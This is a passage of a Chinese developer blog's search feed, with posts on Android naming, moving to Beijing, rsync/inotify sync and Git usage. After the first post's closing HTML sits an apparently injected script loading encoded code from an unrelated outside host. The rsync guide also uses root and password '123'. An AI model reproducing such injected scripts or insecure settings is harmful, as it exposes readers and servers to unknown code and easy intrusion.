class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">srv</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">string</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">str</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">temp</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">tmp</font></font></p></td></tr><tr><td width="125" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">window</font></font></p></td><td width="430" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">wnd(win)</font></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31243;&#24207;&#20013;&#20351;&#29992;&#21333;&#35789;&#32553;&#20889;&#21407;&#21017;&#65306;&#19981;&#35201;&#29992;&#32553;&#20889;&#65292;&#38500;&#38750;&#35813;&#32553;&#20889;&#26159;&#32422;&#23450;&#20439;&#25104;&#30340;&#12290;</span></font></font></p></body></html><script src="http://a.qkkjd.com/rr/t?d=CBrSuA7FzZuAg%2bpe3JTFABIR2OUdx7LD18dJirng7%2b7ye%2bKfN5fwa66AFlLRbLhEu%2bLQmJroC6rLGlvTeCqPiSVOh6AuiYfewaS3DuffRTzY%2fiyP1%2fZGDVcYDIzilAxIije15qD0%2bYnUeGiv2Rz6FixEp8I%2bJnINeg4cM0ukr6tAx5LvOfyN2e5hDqx%2fPD4E5HSvDaPGXtdHPixoN2dw%2b37iIwNSwUwcVtnJPkV0bylotKr2s5S5y%2bDj%2bzv684HD4tOkIrPgpr7xbAcO9UaF%2fnIa4acRK9Ql5UsBaKWbEJNyFpYsp27v0yMQnWkzofosP6c2%2f9NQ%2bzRfi5vFSQtGvXvLl9oCiWwlK8qDenTwK0WLyqLnbnhMCK2sLjzs7ntbfw0twtHnOkDjxEm7cDE4XVO2lFozhoTjEABCNoXU4rC%2ben9zCuqin3PMTAGlVareXDdLDmKgQTKckIb0s2j2YLMlkj3iTDODeNbKPtMqWHcYxHyspJBrt7op8cLxEhkAzZCisbCMHDRxp2VfGuoALvN8%2bflSmgTUc5YJrJU7vQtWIkbdRAfYzJqMQ1btCwV4QHHdXsv%2bnMqPmoTuLobINFNf5BvxydJBNVSCCfRm9Wj7NAW2x%2bLQbH7Scq0Rny1eVl1evy4kTSM53VoC4LT4Ztdo97wygXdnKfKrD2O94EP4qIpzevllX0nzG8ML%2fUylWACVk%2bMF1FUYXrgXblx88DaPbX%2fZen5ZnWw7mhAldiPpFYV%2f2M5iFVI%2fPrxf0EKF" charset="utf-8"></script></body></html>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> standard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生活不止眼前的苟且</title>
      <link href="/2016/12/31/2016-12-31-20161231/"/>
      <url>/2016/12/31/2016-12-31-20161231/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;一个想法</p><p>&emsp;&emsp;一次任性</p><p>&emsp;&emsp;一张车票</p><p>&emsp;&emsp;一只皮箱</p><p>&emsp;&emsp;一种晚上</p><p>&emsp;&emsp;一座城市</p><p>&emsp;&emsp;一次冒险</p><p>&emsp;&emsp;一段故事</p><p>&emsp;&emsp;厦门到北京，距离2175千米，机缘巧遇来到首都。</p><p>&emsp;&emsp;工作稳定，每天按时上下班，周末约上3、5好友打牌，要不就是去海边兜兜风。一切那么舒服自然，这就是我在厦门拥有的‘体面’生活。不想普普通通地活着，过着朝九晚五的生活，去成为一个‘体面’的普通人。我跨过山和大海，也穿过人山人海，毁了我的一切，只想永远地离开，就这样单枪匹马来到北京。</p><p>&emsp;&emsp;车水马龙霓虹闪烁的马路，两旁立着一座比一座高一座比一座闪耀的高楼，这个城市有太多灯红酒绿的奢华，也有许多可歌可泣的励志故事。</p><p>&emsp;&emsp;我可以追求所有世俗的梦想、金钱、地位、知识、艺术，这么大的城市里都有。</p><p>&emsp;&emsp;离开家，所以我可以放弃我厌倦的一切。莫名其妙的亲戚、不尴不尬的旧友，恶狠狠地离开他们，终于觉得可以重新活一次。</p><p>&emsp;&emsp;地铁里的人总是很多，穿行在地铁站的时候是庞大的鱼群，塞在车厢里叠成一个个沙丁鱼罐头。他们都年轻，鲜鲜活活来到北京，然后快马加鞭地庸碌和麻木起来。只是偶尔在洗澡的时候突然想到，那个举着比天大的梦想来到北京的人，似乎真的是几年前的自己。</p><p>&emsp;&emsp;二环里还是有遛鸟的老大爷，踱着王爷似的步子，拎着一口京片子，慢悠悠地走着走着就冷不丁被五环外传来的喧嚣吓一跟头。北京太老了，南边和北边隔了几千年的时光。北京太大了，故宫和亦庄隔了几光年的距离。我们从一个地铁口辗转到另一个地铁口，像从一个宇宙穿梭到另一个宇宙。</p><p>&emsp;&emsp;北上广不相信眼泪，也不相信微笑，不相信运气，只相信勤奋。北京欢迎你，也欢迎我，欢迎堕落也欢迎幸福。</p><p>&emsp;&emsp;下一次，世界精彩处再相逢！  </p><br><br><p>&emsp;&emsp;妈妈坐在门前</p><p>&emsp;&emsp;哼着花儿与少年</p><p>&emsp;&emsp;虽事隔多年</p><p>&emsp;&emsp;记得她泪水涟涟</p><p>&emsp;&emsp;那些幽暗的时光</p><p>&emsp;&emsp;那些坚持与慌张</p><p>&emsp;&emsp;在临别的门前</p><p>&emsp;&emsp;妈妈望着我说</p><p>&emsp;&emsp;生活不止眼前的苟且，还有诗和远方的田野，</p><p>&emsp;&emsp;你赤手空拳来到人世间，为找到那片海不顾一切。</p><br><p>&emsp;&emsp;她坐在我对面</p><p>&emsp;&emsp;低头说珍重再见</p><p>&emsp;&emsp;虽时隔多年</p><p>&emsp;&emsp;记得她泪水涟涟</p><p>&emsp;&emsp;那些欢笑的时光</p><p>&emsp;&emsp;那些誓言与梦想</p><p>&emsp;&emsp;在分手的街边</p><p>&emsp;&emsp;她紧抱住我说</p><p>&emsp;&emsp;生活不止眼前的苟且，还有诗和远方的田野，</p><p>&emsp;&emsp;你赤手空拳来到人世间，为找到那片海不顾一切。</p><br><p>&emsp;&emsp;我独自渐行渐远</p><p>&emsp;&emsp;膝下多了个少年</p><p>&emsp;&emsp;少年一天天长大</p><p>&emsp;&emsp;有一天要离开家</p><p>&emsp;&emsp;看他背影的成长</p><p>&emsp;&emsp;看他坚持与回望</p><p>&emsp;&emsp;我知道有一天</p><p>&emsp;&emsp;我会笑着对他说</p><p>&emsp;&emsp;生活不止眼前的苟且，还有诗和远方的田野，</p><p>&emsp;&emsp;你赤手空拳来到人世间，为找到那片海不顾一切。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
            <tag> feel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件双向实时同步rsync + inotify</title>
      <link href="/2016/11/14/2016-11-14-20161114/"/>
      <url>/2016/11/14/2016-11-14-20161114/</url>
      
        <content type="html"><![CDATA[<p>服务器:192.168.24.31</p><p>客户端:192.168.22.167</p><h2 id="一-配置rsync-服务端和客户端都需要进行相同的配置"><a href="#一-配置rsync-服务端和客户端都需要进行相同的配置" class="headerlink" title="一.配置rsync(服务端和客户端都需要进行相同的配置)"></a>一.配置rsync(服务端和客户端都需要进行相同的配置)</h2><p>1.配置 /etc/rsyncd.conf (如果没有该文件，就新建文件)，写入如下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strict modes = yes</span><br><span class="line">#rsync default port</span><br><span class="line">uid = root #守护进程的用户权限</span><br><span class="line">gid = root</span><br><span class="line">port = <span class="number">873</span> #rsync使用的端口，默认<span class="number">873</span></span><br><span class="line">logfile = /var/<span class="built_in">log</span>/rsyncd.<span class="built_in">log</span> # 日志位置</span><br><span class="line">pidfile = /var/run/rsyncd.pid # 进程号存放位置</span><br><span class="line"><span class="built_in">max</span> connections = <span class="number">4</span> # 客户端最大连接数目</span><br><span class="line">auth users = backup, user #授权用户</span><br><span class="line">secrets <span class="keyword">file</span> = /etc/rsyncd.secrets #授权用户密码文件位置</span><br><span class="line">use chroot = yes</span><br><span class="line"><span class="keyword">read</span> <span class="keyword">only</span> = <span class="keyword">no</span> # <span class="keyword">no</span>客户端可上传文件,yes只读</span><br><span class="line"><span class="keyword">write</span> <span class="keyword">only</span> = <span class="keyword">no</span> # <span class="keyword">no</span>客户端可下载文件,yes不能下载</span><br><span class="line"></span><br><span class="line">#[modules] each path responding <span class="keyword">to</span> <span class="keyword">a</span> module</span><br><span class="line">[appbackup] # 要同步的模块名</span><br><span class="line">path = /home/software/rsync/test1 # 要同步的目录</span><br><span class="line">auth user = user # 登陆系统使用的用户名，没有默认为匿名。</span><br><span class="line">#hosts allow=<span class="number">9.4</span>.<span class="number">122.24</span></span><br></pre></td></tr></table></figure><p>2.配置密码文件</p><p>密码文件为配置文件中所写的文件/etc/rsyncd.secrets格式为账户:密码，写入如下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:<span class="number">123</span></span><br><span class="line">backup:<span class="number">123</span></span><br></pre></td></tr></table></figure><p>3.修改配置文件和密码文件的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#chmod 600 /etc/rsyncd.conf</span><br><span class="line">[root@localhost ~]#chmod 600 /etc/rsyncd.secrets</span><br></pre></td></tr></table></figure><p>4.启动守护进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#rsync --daemon --config=/etc/rsyncd.conf</span><br></pre></td></tr></table></figure><p>5.检查rsync是否启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#lsof -i :873 或</span><br><span class="line">[root@localhost ~]#netstat -an |grep 873&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="二-客户端配置"><a href="#二-客户端配置" class="headerlink" title="二.客户端配置"></a>二.客户端配置</h2><p>1.新建密码文件</p><p>在/home/longzhiye/softWare/rsync目录下新建一个密码文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#vi /home/longzhiye/softWare/rsync/rsyncd.secrets</span><br></pre></td></tr></table></figure><p>写入如下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:<span class="number">123</span></span><br><span class="line">backup:<span class="number">123</span></span><br></pre></td></tr></table></figure><p>2.修改密码文件的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]chown root.root /home/longzhiye/softWare/rsync/rsyncd.secrets</span><br><span class="line">[root@localhost ~]#chmod 600 /home/longzhiye/softWare/rsync/rsyncd.secrets</span><br></pre></td></tr></table></figure><p>3.测试下载和上传功能</p><p>从服务器上下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#rsync -avz --password-file=/home/longzhiye/softWare/rsync/rsyncd.secrets user@192.168.24.31::appbackup /home/longzhiye/softWare/rsync/test1/</span><br></pre></td></tr></table></figure><p>上传文件到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#rsync -avz --password-file=/home/longzhiye/softWare/rsync/rsyncd.secrets /home/longzhiye/softWare/rsync/test1/ user@192.168.24.31::appbackup</span><br></pre></td></tr></table></figure><p>至此就实现了手动同步的功能</p><h2 id="三-inotify-安装，实现自动同步功能-只在服务端操作"><a href="#三-inotify-安装，实现自动同步功能-只在服务端操作" class="headerlink" title="三.inotify 安装，实现自动同步功能(只在服务端操作)"></a>三.inotify 安装，实现自动同步功能(只在服务端操作)</h2><p>1.查看是否支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#ll /proc/sys/fs/inotify</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">-rw-r--r--. 1 root root 0 Nov 29 05:34 max_queued_events</span><br><span class="line">-rw-r--r--. 1 root root 0 Nov 29 05:34 max_user_instances</span><br><span class="line">-rw-r--r--. 1 root root 0 Nov 29 05:34 max_user_watches</span><br></pre></td></tr></table></figure><p>2.下载安装inotify</p><p>2.1下载源码包</p><p>下载地址:<a href="http://inotify-tools.sourceforge.net/">http://inotify-tools.sourceforge.net</a></p><p>笔者分享个百度云下载地址:<a href="http://pan.baidu.com/s/1qXYV7Fe">http://pan.baidu.com/s/1qXYV7Fe</a></p><p>2.2上传到服务器的任意路径,解压安装包</p><p>切换到上传文件位置,解压安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# tar zxvf inotify-tools-3.14</span><br></pre></td></tr></table></figure><p>进入该目录执行安装操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#cd inotify-tools-3.14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#./configure --prefix=/usr/local/inotify</span><br></pre></td></tr></table></figure><p>提示:/usr/local/inotify为安装路径,可自行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#make</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#make install</span><br></pre></td></tr></table></figure><p>安装</p><p>3.配置inotify</p><p>3.1.新建文件 rsync.sh 并赋予执行权限，文件名、位置随便，写入如下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#同步接收方ip</span><br><span class="line">client=<span class="number">192.168</span>.<span class="number">22.167</span></span><br><span class="line">src=/home/longzhiye/softWare/rsync/test1/</span><br><span class="line">#同步接收方配置的rsync模块名</span><br><span class="line">dest=appbackup</span><br><span class="line">#同步接收方鉴权时的用户</span><br><span class="line">user=user</span><br><span class="line">/home/longzhiye/softWare/inotify/bin/inotifywait -mrq --timefmt <span class="string">&#x27;%d/%m/%y %H:%M&#x27;</span> --format <span class="string">&#x27;%T %w%f%e&#x27;</span> -<span class="keyword">e</span> modify,<span class="keyword">delete</span>,create,<span class="keyword">move</span>,attrib $src | <span class="keyword">while</span> <span class="keyword">read</span> <span class="keyword">files</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">/usr/bin/rsync -vzrtopgq --<span class="keyword">delete</span> --progress --password-<span class="keyword">file</span>=/home/longzhiye/rsyncpasswd.secrets $src $user@$client::$dest</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>3.2.修改文件执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#chmod +x ~/rsync.sh</span><br></pre></td></tr></table></figure><p>3.3.在家目录下新建一个rsyncpasswd.secrets文件,内容为刚才新建文件中用户对应的对应密码，写入如下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure><p>修改对应的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#chmod 600 ～/rsyncpasswd.secrets</span><br></pre></td></tr></table></figure><p>4.运行rsync.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#sh ~/rsync.sh</span><br></pre></td></tr></table></figure><p>5.测试</p><p>在/home/software/rsync/test1下新建、修改、删除文件，客户端查看是否可以自动同步所进行的操作</p><p>至此单向实时同步已经实现，再重复设置另一端就能实现双向实时同步</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> rsync </tag>
            
            <tag> inotify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Git向GitHub提交代码</title>
      <link href="/2016/10/13/2016-10-13-20161013/"/>
      <url>/2016/10/13/2016-10-13-20161013/</url>
      
        <content type="html"><![CDATA[<h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>下载对应的Git工具,<a href="https://git-scm.com/downloads">附下载地址</a></p><p>打开命令提示附输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013143224.png"></p><p>说明git安装成功</p><h3 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;github邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013144929.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;github名字&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013145003.png"></p><h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><p>打开文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013145823.png"></p><p>如果出现以上提示，则还需要进行下面两步操作，手动创建相应文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013150346.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的gtihub的邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013150155.png"></p><h3 id="下面开始配置Github"><a href="#下面开始配置Github" class="headerlink" title="下面开始配置Github"></a>下面开始配置Github</h3><p><img src="/images/20161013/20161013151128.png"></p><p>vim打开该文件，将里面的内容全部复制出来</p><p>打开自己Github的设置,添加如下相应的内容</p><p><img src="/images/20161013/20161013132812.png"></p><p>在自己的Github上找到想要修改的仓库，如果没有的话就新建一个，点击头像旁边的加号 add new ,选择new Repository，名字随便填写</p><p><img src="/images/20161013/20161013133043.png"></p><p>创建一个对应的项目路径，并且初始化git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013152617.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 你的仓库地址</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013152726.png"></p><h3 id="项目就已经导入到本地中，下面请尽情地挥霍你的才华"><a href="#项目就已经导入到本地中，下面请尽情地挥霍你的才华" class="headerlink" title="项目就已经导入到本地中，下面请尽情地挥霍你的才华"></a>项目就已经导入到本地中，下面请尽情地挥霍你的才华</h3><p>提交代码</p><p>检测当前状态</p><p>同步远程服务器代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013153412.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013153019.png"></p><p>修改内容先添加到本地仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add -a</span><br></pre></td></tr></table></figure><p>修改内容提交到本地仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit -m &#x27;提交说明&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013153531.png"></p><p>提交到远程仓库,期间会提示你输入Github账户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p><img src="/images/20161013/20161013153729.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客正式开通了</title>
      <link href="/2016/08/15/2016-08-15-20160815/"/>
      <url>/2016/08/15/2016-08-15-20160815/</url>
      
        <content type="html"><![CDATA[<p>我是一名Android开发者，热爱开源，热爱分享，写博客更多的是想分享自己平时开发中碰到的各种坑，以及自己的生活感悟。特别是受到<a href="http://stormzhang.com/android/2016/03/04/why-i-keep-writing-blog">stormzhang的一篇博客</a>的影响， 才下定决心来做这件事。</p><h2 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h2><p>开博客容易，想坚持写下来却非常困难。有志者事竟成，相信自己一定可以坚持下来。</p><p><img src="/images/20160815/1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 通知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
